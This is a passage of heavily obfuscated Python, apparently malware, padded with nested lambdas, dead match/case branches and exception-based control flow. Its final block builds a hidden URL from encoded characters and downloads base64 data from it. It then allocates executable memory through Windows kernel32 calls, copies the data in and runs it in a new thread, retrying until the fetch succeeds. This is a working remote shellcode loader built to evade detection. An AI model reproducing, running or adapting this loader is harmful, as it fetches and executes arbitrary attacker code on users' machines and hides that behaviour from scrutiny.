        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _65 = [[(lambda : (lambda _42: _42 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _414: _414 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _914: _914 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _116:
        try:
            raise MemoryError(__5963620520738)
        except MemoryError as __5252185184650:
            if __5252185184650.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __5252185184650.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6210376504578 = (lambda : R_E_D__A_V(b'R_E_D__A_V__ \xf7Z{\t\x9e'))()
            if __5252185184650.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4184258857279 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x99\xd8i\x80I\xd2'))()
try:
    match '613' == '710':
        case True:
            raise MemoryError([True])
        case False:
            _213 = [[True], [False]]
            R_E_D__A_V______(['_164'])
    raise MemoryError([True])
except MemoryError as _512:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _67: _67 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _613 = [[(lambda : (lambda _27: _27 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _136: _136 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1517: _1517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _718:
        while (lambda : (lambda _714: _714 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy6'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy8'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyG'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyC'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyM'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue